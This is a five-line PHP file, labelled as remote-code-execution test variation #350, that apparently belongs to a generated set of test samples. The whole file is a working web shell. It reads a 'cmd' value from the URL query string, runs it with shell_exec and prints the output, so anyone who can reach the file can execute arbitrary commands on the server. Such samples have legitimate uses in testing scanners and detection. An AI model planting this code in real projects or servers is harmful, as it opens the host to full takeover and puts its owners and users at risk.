<?php
// RCE test variation #350
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>